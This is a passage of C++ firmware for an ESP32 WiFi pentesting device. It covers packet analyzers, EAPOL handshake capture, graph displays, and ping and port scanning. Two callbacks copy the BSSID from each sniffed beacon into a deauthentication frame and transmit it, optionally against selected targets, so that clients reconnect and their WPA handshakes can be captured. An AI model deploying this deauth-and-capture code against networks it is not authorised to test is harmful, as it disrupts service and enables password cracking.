    if (wifi_scan_obj.analyzer_frames_recvd < 254)
      wifi_scan_obj.analyzer_frames_recvd++;

    if (wifi_scan_obj.analyzer_frames_recvd >= ANALYZER_NAME_REFRESH) {
      if (type == WIFI_PKT_MGMT) { // It's management
        len -= 4;
        //int fctl = ntohs(frameControl->fctl);
        //const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
        //const WifiMgmtHdr *hdr = &ipkt->hdr;
        if ((snifferPacket->payload[0] == 0x80) && (buff == 0)) { // It's a beacon
          // Get source addr
          char addr[] = "00:00:00:00:00:00";
          getMAC(addr, snifferPacket->payload, 10);

          // Show us RSSI
          display_string.concat(snifferPacket->rx_ctrl.rssi);
          display_string.concat(" ");

          // Get ESSID if exists else give BSSID to display string
          if (snifferPacket->payload[37] <= 0) // There is no ESSID. Just add BSSID
            display_string.concat(addr);
          else { // There is an ESSID. Add it
            for (int i = 0; i < snifferPacket->payload[37]; i++)
            {
              display_string.concat((char)snifferPacket->payload[i + 38]);
            }
          }
        }
        wifi_scan_obj.analyzer_name_string = display_string;
        wifi_scan_obj.analyzer_frames_recvd = 0;
        wifi_scan_obj.analyzer_name_update = true;
      }
    }
  }
  else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_PACKET_RATE) {
    bool found = false;
    // Get the source addr
    char addr[] = "00:00:00:00:00:00";
    getMAC(addr, snifferPacket->payload, 10);
    uint16_t targ_index = 0;
    AccessPoint targ_ap;
    Station targ_sta;

    // Check list of APs
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected) {
        uint8_t addr[] = {snifferPacket->payload[10],
                          snifferPacket->payload[11],
                          snifferPacket->payload[12],
                          snifferPacket->payload[13],
                          snifferPacket->payload[14],
                          snifferPacket->payload[15]};
        // Compare AP bssid to ssid of recvd packet
        for (int x = 0; x < 6; x++) {
          if (addr[x] != access_points->get(i).bssid[x]) {
            found = false;
            break;
          }
          else
            found = true;
        }
        if (found) {
          targ_ap = access_points->get(i);
          targ_index = i;
          break;
        }
      }
    }

    // Update AP
    if (found) {
      if (targ_ap.packets < 65530) {
        targ_ap.packets = targ_ap.packets + 1;
        access_points->set(targ_index, targ_ap);
      }
      //Serial.println((String)access_points->get(targ_index).essid + " Packets: " + (String)access_points->get(targ_index).packets);
      return;
    }

    // Check list of Stations
    for (int i = 0; i < stations->size(); i++) {
      if (stations->get(i).selected) {
        uint8_t addr[] = {snifferPacket->payload[10],
                          snifferPacket->payload[11],
                          snifferPacket->payload[12],
                          snifferPacket->payload[13],
                          snifferPacket->payload[14],
                          snifferPacket->payload[15]};
        // Compare AP bssid to ssid of recvd packet
        for (int x = 0; x < 6; x++) {
          if (addr[x] != stations->get(i).mac[x]) {
            found = false;
            break;
          }
          else
            found = true;
        }
        if (found) {
          targ_sta = stations->get(i);
          targ_index = i;
          break;
        }
      }
    }

    // Update AP
    if (found) {
      if (targ_sta.packets < 65530) {
        targ_sta.packets = targ_sta.packets + 1;
        stations->set(targ_index, targ_sta);
      }
      //Serial.print(addr);
      //Serial.println(" Packets: " + (String)stations->get(targ_index).packets);
      return;
    }
  }
}

void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;
  bool send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  #ifdef HAS_SCREEN
    int buff = display_obj.display_buffer->size();
  #else
    int buff = 0;
  #endif

  // Found beacon frame. Decide whether to deauth
  if (send_deauth) {
    if (snifferPacket->payload[0] == 0x80) {    
      // Build packet
      
      wifi_scan_obj.deauth_frame_default[10] = snifferPacket->payload[10];
      wifi_scan_obj.deauth_frame_default[11] = snifferPacket->payload[11];
      wifi_scan_obj.deauth_frame_default[12] = snifferPacket->payload[12];
      wifi_scan_obj.deauth_frame_default[13] = snifferPacket->payload[13];
      wifi_scan_obj.deauth_frame_default[14] = snifferPacket->payload[14];
      wifi_scan_obj.deauth_frame_default[15] = snifferPacket->payload[15];
    
      wifi_scan_obj.deauth_frame_default[16] = snifferPacket->payload[10];
      wifi_scan_obj.deauth_frame_default[17] = snifferPacket->payload[11];
      wifi_scan_obj.deauth_frame_default[18] = snifferPacket->payload[12];
      wifi_scan_obj.deauth_frame_default[19] = snifferPacket->payload[13];
      wifi_scan_obj.deauth_frame_default[20] = snifferPacket->payload[14];
      wifi_scan_obj.deauth_frame_default[21] = snifferPacket->payload[15];      
    
      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
      delay(1);
    }


  }

  if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
    num_eapol++;
    Serial.println("Received EAPOL:");

    char addr[] = "00:00:00:00:00:00";
    getMAC(addr, snifferPacket->payload, 10);
    display_string.concat(addr);

    int temp_len = display_string.length();

   #ifdef HAS_SCREEN
      for (int i = 0; i < 40 - temp_len; i++)
      {
        display_string.concat(" ");
      }

      Serial.print(" ");

      #ifdef SCREEN_BUFFER
        #ifndef HAS_ILI9341
          display_obj.display_buffer->add(display_string);
        #endif
      #endif
    #else
      Serial.println(addr);    
    #endif
  }

  buffer_obj.append(snifferPacket, len);
}

void WiFiScan::activeEapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;

  bool send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }
  
  // Found beacon frame. Decide whether to deauth

  if (snifferPacket->payload[0] == 0x80) {   

    // Do target stuff
    if (wifi_scan_obj.currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) {
      bool found = false;

      // Check list of APs
      for (int i = 0; i < access_points->size(); i++) {
        if (access_points->get(i).selected) {
          uint8_t addr[] = {snifferPacket->payload[10],
                            snifferPacket->payload[11],
                            snifferPacket->payload[12],
                            snifferPacket->payload[13],
                            snifferPacket->payload[14],
                            snifferPacket->payload[15]};
          // Compare AP bssid to ssid of recvd packet
          for (int x = 0; x < 6; x++) {
            if (addr[x] != access_points->get(i).bssid[x]) {
              found = false;
              break;
            }
            else
              found = true;
          }
          if (found) {
            Serial.println("Received beacon from " + access_points->get(i).essid + ". Deauthenticating...");
            break;
          }
        }
      }
      if (!found)
        return;      
    } // End targeted stuff 
    // Build packet
    
    wifi_scan_obj.deauth_frame_default[10] = snifferPacket->payload[10];
    wifi_scan_obj.deauth_frame_default[11] = snifferPacket->payload[11];
    wifi_scan_obj.deauth_frame_default[12] = snifferPacket->payload[12];
    wifi_scan_obj.deauth_frame_default[13] = snifferPacket->payload[13];
    wifi_scan_obj.deauth_frame_default[14] = snifferPacket->payload[14];
    wifi_scan_obj.deauth_frame_default[15] = snifferPacket->payload[15];
  
    wifi_scan_obj.deauth_frame_default[16] = snifferPacket->payload[10];
    wifi_scan_obj.deauth_frame_default[17] = snifferPacket->payload[11];
    wifi_scan_obj.deauth_frame_default[18] = snifferPacket->payload[12];
    wifi_scan_obj.deauth_frame_default[19] = snifferPacket->payload[13];
    wifi_scan_obj.deauth_frame_default[20] = snifferPacket->payload[14];
    wifi_scan_obj.deauth_frame_default[21] = snifferPacket->payload[15];      
  
    // Send packet
    esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
    delay(1);
  }



  if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
    num_eapol++;
    Serial.println("Received EAPOL:");

  }

  buffer_obj.append(snifferPacket, len);
}

#ifdef HAS_SCREEN
  int8_t WiFiScan::checkAnalyzerButtons(uint32_t currentTime) {
    boolean pressed = false;
  
    uint16_t t_x = 0, t_y = 0; // To store the touch coordinates

    // Do the touch stuff
    #ifdef HAS_ILI9341
      pressed = display_obj.updateTouch(&t_x, &t_y);
      //pressed = display_obj.tft.getTouch(&t_x, &t_y);
    #endif

    // Check buttons for presses
    for (int8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
    {
      if (pressed && display_obj.key[b].contains(t_x, t_y))
      {
        display_obj.key[b].press(true);
      } else {
        display_obj.key[b].press(false);
      }
    }

    // Which buttons pressed
    for (int8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
    {  
      if (display_obj.key[b].justReleased()) return b;
    }
    return -1;
  }
#endif

#ifdef HAS_SCREEN
  void WiFiScan::eapolMonitorMain(uint32_t currentTime)
  {  
    for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
    {
      currentTime = millis();
      do_break = false;
  
      y_pos_x = 0;
      y_pos_y = 0;
      y_pos_z = 0;
      /*boolean pressed = false;
  
      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
  
      // Do the touch stuff
      #ifdef HAS_ILI9341
        pressed = display_obj.tft.getTouch(&t_x, &t_y);
      #endif
  
      // Check buttons for presses
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (pressed && display_obj.key[b].contains(t_x, t_y))
        {
          display_obj.key[b].press(true);
        } else {
          display_obj.key[b].press(false);
        }
      }*/
  
      // Which buttons pressed
      //for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      //{  
      //  if (display_obj.key[b].justReleased())
      //  {
       //   do_break = true;

          int8_t b = this->checkAnalyzerButtons(currentTime);
  
          // Channel - button pressed
          if (b == 4) {
            if (set_channel > 1) {
              Serial.println("Shit channel down");
              set_channel--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              //break;
            }
          }
  
          // Channel + button pressed
          else if (b == 5) {
            if (set_channel < MAX_CHANNEL) {
              Serial.println("Shit channel up");
              set_channel++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              //break;
            }
          }
          else if (b == 6) {
            Serial.println("Exiting packet monitor...");
            this->StartScan(WIFI_SCAN_OFF);
            //display_obj.tft.init();
            this->orient_display = true;
            return;
          }
      //  }
      //}
  
      if (currentTime - initTime >= (GRAPH_REFRESH * 5)) {
        x_pos += x_scale;
        initTime = millis();
        y_pos_x = ((-num_eapol * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
        if (y_pos_x >= HEIGHT_1) {
          Serial.println("Max EAPOL number reached. Adjusting...");
          num_eapol = 0;
        }
  
        //CODE FOR PLOTTING CONTINUOUS LINES!!!!!!!!!!!!
        //Plot "X" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x, TFT_CYAN);
  
        //Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS AND COLOR KEY!!!
        if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) //above x axis
          display_obj.tft.fillRect(x_pos+1, 28, 10, 93, TFT_BLACK); //compensate for buttons!
        else
          display_obj.tft.fillRect(x_pos+1, 0, 10, 121, TFT_BLACK); //don't compensate for buttons!

        if (x_pos < 0) // below x axis
          display_obj.tft.fillRect(x_pos+1, 121, 10, 88, TFT_CYAN);
        else
          display_obj.tft.fillRect(x_pos+1, 121, 10, 118, TFT_BLACK);
  
  
        if ( (y_pos_x == 120) || (y_pos_y == 120) || (y_pos_z == 120) )
        {
          display_obj.tft.drawFastHLine(10, 120, 310, TFT_WHITE); // x axis
        }
  
        y_pos_x_old = y_pos_x; //set old y pos values to current y pos values 
  
      }
  
      #ifdef HAS_SD
        sd_obj.main();
      #endif
  
    }
  
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); //erase XY buttons and any lines behind them
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
    display_obj.tftDrawEapolColorKey();
    display_obj.tftDrawGraphObjects(x_scale);
  }

  void WiFiScan::packetMonitorMain(uint32_t currentTime)
  {
    
    
    for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
    {
      currentTime = millis();
      do_break = false;
      
      y_pos_x = 0;
      y_pos_y = 0;
      y_pos_z = 0;
      /*boolean pressed = false;
      
      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
  
      // Do the touch stuff
      #ifdef HAS_ILI9341
        pressed = display_obj.tft.getTouch(&t_x, &t_y);
      #endif
  
      if (pressed) {
        Serial.print("Got touch | X: ");
        Serial.print(t_x);
        Serial.print(" Y: ");
        Serial.println(t_y);
      }
  
  
      // Check buttons for presses
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (pressed && display_obj.key[b].contains(t_x, t_y))
        {
          display_obj.key[b].press(true);
        } else {
          display_obj.key[b].press(false);
        }
      }*/
      
      // Which buttons pressed
      //for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      //{
  
      //  if (display_obj.key[b].justReleased())
      //  {
      //    do_break = true;

      int8_t b = this->checkAnalyzerButtons(currentTime);
          
          // X - button pressed
          if (b == 0) {
            if (x_scale > 1) {
              x_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //break;
            }
          }
          // X + button pressed
          else if (b == 1) {
            if (x_scale < 6) {
              x_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //break;
            }
          }
  
          // Y - button pressed
          else if (b == 2) {
            if (y_scale > 1) {
              y_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              //break;
            }
          }
  
          // Y + button pressed
          else if (b == 3) {
            if (y_scale < 9) {
              y_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              //break;
            }
          }
  
          // Channel - button pressed
          else if (b == 4) {
            if (set_channel > 1) {
              Serial.println("Shit channel down");
              set_channel--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              //break;
            }
          }
  
          // Channel + button pressed
          else if (b == 5) {
            if (set_channel < MAX_CHANNEL) {
              Serial.println("Shit channel up");
              set_channel++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              //break;
            }
          }
          else if (b == 6) {
            Serial.println("Exiting packet monitor...");
            this->StartScan(WIFI_SCAN_OFF);
            this->orient_display = true;
            return;
          }
      //  }
      //}
  
      if (currentTime - initTime >= GRAPH_REFRESH) {
        x_pos += x_scale;
        initTime = millis();
        y_pos_x = ((-num_beacon * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
        y_pos_y = ((-num_deauth * (y_scale * 3)) + (HEIGHT_1 - 2)); // RED
        y_pos_z = ((-num_probe * (y_scale * 3)) + (HEIGHT_1 - 2)); // BLUE
    
        num_beacon = 0;
        num_probe = 0;
        num_deauth = 0;
        
        //CODE FOR PLOTTING CONTINUOUS LINES!!!!!!!!!!!!
        //Plot "X" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x, TFT_GREEN);
        //Plot "Z" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_z_old, x_pos, y_pos_z, TFT_BLUE);
        //Plot "Y" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_y_old, x_pos, y_pos_y, TFT_RED);
        
        //Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS AND COLOR KEY!!!
        if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) //above x axis
          display_obj.tft.fillRect(x_pos+1, 28, 10, 93, TFT_BLACK); //compensate for buttons!
        else
          display_obj.tft.fillRect(x_pos+1, 0, 10, 121, TFT_BLACK); //don't compensate for buttons!

        if (x_pos < 0) // below x axis
          display_obj.tft.fillRect(x_pos+1, 121, 10, 88, TFT_CYAN);
        else
          display_obj.tft.fillRect(x_pos+1, 121, 10, 118, TFT_BLACK);
        
        
        if ( (y_pos_x == 120) || (y_pos_y == 120) || (y_pos_z == 120) )
          display_obj.tft.drawFastHLine(10, 120, 310, TFT_WHITE); // x axis
         
        y_pos_x_old = y_pos_x; //set old y pos values to current y pos values 
        y_pos_y_old = y_pos_y;
        y_pos_z_old = y_pos_z;
    
        //delay(50);
      }
  
      #ifdef HAS_SD
        sd_obj.main();
      #endif
     
    }
    
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); //erase XY buttons and any lines behind them
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
    
    display_obj.tftDrawXScaleButtons(x_scale); //re-draw stuff
    display_obj.tftDrawYScaleButtons(y_scale);
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
    display_obj.tftDrawColorKey();
    display_obj.tftDrawGraphObjects(x_scale);
  }
#endif

void WiFiScan::changeChannel(int chan) {
  this->set_channel = chan;
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  #ifdef HAS_SCREEN
    if (this->currentScanMode == WIFI_SCAN_CHAN_ANALYZER)
      this->addAnalyzerValue(this->set_channel * -1, -72, this->_analyzer_values, TFT_WIDTH);
  #endif
}

void WiFiScan::changeChannel()
{
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

// Function to cycle to the next channel
void WiFiScan::channelHop()
{
  #ifndef HAS_DUAL_BAND
    this->set_channel = this->set_channel + 1;
    if (this->set_channel > 14) {
      this->set_channel = 1;
    }
  #else
    this->set_channel = this->dual_band_channels[this->dual_band_channel_index];
    if (this->dual_band_channel_index >= DUAL_BAND_CHANNELS)
      this->dual_band_channel_index = 0;
    else
      this->dual_band_channel_index++;
  #endif

  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

char* WiFiScan::stringToChar(String string) {
  char buf[string.length() + 1] = {};
  string.toCharArray(buf, string.length() + 1);

  return buf;
}

void WiFiScan::addAnalyzerValue(int16_t value, int rssi_avg, int16_t target_array[], int array_size) {
  // Shift all elements up by one index
  for (int i = array_size - 1; i > 0; i--) {
    target_array[i] = target_array[i - 1];
  }
  // Add the new value to the start of the array
  target_array[0] = value;
}

void WiFiScan::signalAnalyzerLoop(uint32_t tick) {
  #ifdef HAS_SCREEN
    #ifdef HAS_ILI9341
      int8_t b = this->checkAnalyzerButtons(millis());

      if (b == 6) {
        this->StartScan(WIFI_SCAN_OFF);
        this->orient_display = true;
        return;
      }
      else if (b == 4) {
        if (set_channel > 1) {
          set_channel--;
          display_obj.tftDrawChannelScaleButtons(set_channel, false);
          display_obj.tftDrawExitScaleButtons(false);
          changeChannel();
          return;
        }
      }

      // Channel + button pressed
      else if (b == 5) {
        if (set_channel < MAX_CHANNEL) {
          set_channel++;
          display_obj.tftDrawChannelScaleButtons(set_channel, false);
          display_obj.tftDrawExitScaleButtons(false);
          changeChannel();
          return;
        }
      }
    #endif
  #endif
}

void WiFiScan::channelAnalyzerLoop(uint32_t tick) {
  #ifdef HAS_SCREEN
    if (tick - this->initTime >= BANNER_TIME) {
      this->initTime = millis();
      this->addAnalyzerValue(this->_analyzer_value * BASE_MULTIPLIER, -72, this->_analyzer_values, TFT_WIDTH);
      this->_analyzer_value = 0;
      if (this->analyzer_name_update) {
        this->displayAnalyzerString(this->analyzer_name_string);
        this->analyzer_name_update = false;
      }
    }

    #ifdef HAS_ILI9341
      int8_t b = this->checkAnalyzerButtons(millis());

      if (b == 6) {
        this->StartScan(WIFI_SCAN_OFF);
        this->orient_display = true;
        return;
      }
      else if (b == 4) {
        if (set_channel > 1) {
          set_channel--;
          display_obj.tftDrawChannelScaleButtons(set_channel, false);
          display_obj.tftDrawExitScaleButtons(false);
          changeChannel();
          return;
        }
      }

      // Channel + button pressed
      else if (b == 5) {
        if (set_channel < MAX_CHANNEL) {
          set_channel++;
          display_obj.tftDrawChannelScaleButtons(set_channel, false);
          display_obj.tftDrawExitScaleButtons(false);
          changeChannel();
          return;
        }
      }
    #endif
  #endif
}

void WiFiScan::displayAnalyzerString(String str) {
  #ifdef HAS_SCREEN
    display_obj.tft.fillRect(0, 
                            TFT_HEIGHT - GRAPH_VERT_LIM - (CHAR_WIDTH * 4), 
                            TFT_WIDTH, 
                            CHAR_WIDTH + 2, 
                            TFT_BLACK);
    //display_obj.tft.drawCentreString("Frames/" + (String)BANNER_TIME + "ms", TFT_WIDTH / 2, TFT_HEIGHT - GRAPH_VERT_LIM - (CHAR_WIDTH * 2), 1);
    display_obj.tft.setCursor(0, TFT_HEIGHT - GRAPH_VERT_LIM - (CHAR_WIDTH * 4));
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
    display_obj.tft.println(str);
  #endif
}

void WiFiScan::renderRawStats() {
  #ifdef HAS_SCREEN
    uint8_t line_count = 0;
    display_obj.tft.fillRect(0,
                            (STATUS_BAR_WIDTH * 2) + 1 + EXT_BUTTON_WIDTH,
                            TFT_WIDTH,
                            TFT_HEIGHT - STATUS_BAR_WIDTH + 1,
                            TFT_BLACK);
    display_obj.tft.setCursor(0, (STATUS_BAR_WIDTH * 2) + CHAR_WIDTH + EXT_BUTTON_WIDTH);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);

    display_obj.tft.println("Stats\n");

    display_obj.tft.println("     Mgmt: " + (String)this->mgmt_frames);
    display_obj.tft.println("     Data: " + (String)this->data_frames);
    display_obj.tft.println("  Channel: " + (String)this->set_channel);
    display_obj.tft.println("   Beacon: " + (String)this->beacon_frames);
    display_obj.tft.println("Probe Req: " + (String)this->req_frames);
    display_obj.tft.println("Probe Res: " + (String)this->resp_frames);
    display_obj.tft.println("   Deauth: " + (String)this->deauth_frames);
    display_obj.tft.println("    EAPOL: " + (String)this->eapol_frames);
    display_obj.tft.println("     RSSI: " + (String)this->min_rssi + " - " + (String)this->max_rssi);

  #endif

  Serial.println("     Mgmt: " + (String)this->mgmt_frames);
  Serial.println("     Data: " + (String)this->data_frames);
  Serial.println("  Channel: " + (String)this->set_channel);
  Serial.println("   Beacon: " + (String)this->beacon_frames);
  Serial.println("Probe Req: " + (String)this->req_frames);
  Serial.println("Probe Res: " + (String)this->resp_frames);
  Serial.println("   Deauth: " + (String)this->deauth_frames);
  Serial.println("    EAPOL: " + (String)this->eapol_frames);
  Serial.println("     RSSI: " + (String)this->min_rssi + " - " + (String)this->max_rssi);
}

void WiFiScan::renderPacketRate() {
  uint8_t line_count = 0;
  #ifdef HAS_SCREEN
    display_obj.tft.fillRect(0,
                            (STATUS_BAR_WIDTH * 2) + 1 + EXT_BUTTON_WIDTH,
                            TFT_WIDTH,
                            TFT_HEIGHT - STATUS_BAR_WIDTH + 1,
                            TFT_BLACK);
    display_obj.tft.setCursor(0, (STATUS_BAR_WIDTH * 2) + CHAR_WIDTH + EXT_BUTTON_WIDTH);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
  #endif

  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      #ifdef HAS_SCREEN
        display_obj.tft.println(access_points->get(i).essid + ": " + (String)access_points->get(i).packets);
      #endif
      Serial.println(access_points->get(i).essid + ": " + (String)access_points->get(i).packets);
    }
  }
  for (int i = 0; i < stations->size(); i++) {
    if (stations->get(i).selected) {
      #ifdef HAS_SCREEN
        display_obj.tft.println(macToString(stations->get(i).mac) + ": " + (String)stations->get(i).packets);
      #endif
      Serial.println(macToString(stations->get(i).mac) + ": " + (String)stations->get(i).packets);
    }
  }

}

void WiFiScan::packetRateLoop(uint32_t tick) {
  if (tick - this->initTime >= BANNER_TIME * 10) {
    this->initTime = millis();
    if (this->currentScanMode == WIFI_SCAN_PACKET_RATE)
      this->renderPacketRate();
    else if (this->currentScanMode == WIFI_SCAN_RAW_CAPTURE)
      this->renderRawStats();

  }

  #ifdef HAS_ILI9341
    int8_t b = this->checkAnalyzerButtons(millis());

    if (b == 6) {
      this->StartScan(WIFI_SCAN_OFF);
      this->orient_display = true;
      return;
    }
    else if (b == 4) {
      if (set_channel > 1) {
        set_channel--;
        display_obj.tftDrawChannelScaleButtons(set_channel, false);
        display_obj.tftDrawExitScaleButtons(false);
        changeChannel();
        return;
      }
    }

    // Channel + button pressed
    else if (b == 5) {
      if (set_channel < MAX_CHANNEL) {
        set_channel++;
        display_obj.tftDrawChannelScaleButtons(set_channel, false);
        display_obj.tftDrawExitScaleButtons(false);
        changeChannel();
        return;
      }
    }
  #endif
}

bool WiFiScan::checkHostPort(IPAddress ip, uint16_t port, uint16_t timeout) {
  WiFiClient client;

  client.setTimeout(timeout);

  if (client.connect(ip, port)) {
    client.stop();
    return true;
  }

  client.stop();
  return false;
}

void WiFiScan::pingScan() {
  String display_string = "";
  String output_line = "";
  if (this->current_scan_ip != IPAddress(0, 0, 0, 0)) {
    this->current_scan_ip = getNextIP(this->current_scan_ip, this->subnet);
    
    // Check if IP is alive
    if (this->isHostAlive(this->current_scan_ip)) {
      output_line = this->current_scan_ip.toString();
      display_string.concat(output_line);
      uint8_t temp_len = display_string.length();
      for (uint8_t i = 0; i < 40 - temp_len; i++)
      {
        display_string.concat(" ");
      }
      ipList->add(this->current_scan_ip);
      #ifdef HAS_SCREEN
        display_obj.display_buffer->add(display_string);
      #endif
      buffer_obj.append(output_line + "\n");
      Serial.println(output_line);
    }
  }
  else {
    if (!this->scan_complete) {
      this->scan_complete = true;
      #ifdef HAS_SCREEN
        display_obj.display_buffer->add("Scan complete");
      #endif
    }
  }
}

void WiFiScan::portScan(uint8_t scan_mode) {
  String display_string = "";
  if (scan_mode == WIFI_PORT_SCAN_ALL) {
    if (this->current_scan_port < MAX_PORT) {
      this->current_scan_port = getNextPort(this->current_scan_port);
      if (this->current_scan_port % 1000 == 0) {
        Serial.print("Checking IP: ");
        Serial.print(this->current_scan_ip);
        Serial.print(" Port: ");
        Serial.println(this->current_scan_port);
      }
      if (this->checkHostPort(this->current_scan_ip, this->current_scan_port, 100)) {
        String output_line = this->current_scan_ip.toString() + ": " + (String)this->current_scan_port;
        display_string.concat(output_line);
        uint8_t temp_len = display_string.length();
        for (uint8_t i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
        #ifdef HAS_SCREEN
          display_obj.display_buffer->add(display_string);
        #endif
        Serial.println(output_line);
        buffer_obj.append(output_line + "\n");
      }
    }
    else {
      if (!this->scan_complete) {
        this->scan_complete = true;
        #ifdef HAS_SCREEN
          display_obj.display_buffer->add("Scan complete");
        #endif
      }
    }
  }

}


// Function for updating scan status
void WiFiScan::main(uint32_t currentTime)
{
  // WiFi operations
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
